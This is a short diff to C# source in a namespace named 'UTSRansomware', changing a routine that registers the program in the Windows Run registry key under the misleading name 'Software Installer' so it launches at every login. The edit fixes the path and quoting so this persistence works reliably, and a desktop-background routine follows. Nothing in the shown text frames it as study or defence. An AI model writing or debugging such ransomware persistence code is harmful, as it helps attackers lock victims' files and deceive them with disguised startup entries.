@@ -56,11 +56,16 @@ namespace UTSRansomware
         public static void AddToStartup()
         {
             string appName = "Software Installer";
-            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+
+            // Get the path of the main executable, not the DLL
+            string appPath = Process.GetCurrentProcess().MainModule.FileName;
 
             RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            startupKey.SetValue(appName, appPath);
+
+            // Ensure path is in quotes in case there are spaces in the path
+            startupKey.SetValue(appName, $"\"{appPath}\"");
         }
+
 
         public static void SetDesktopBackground()
         {
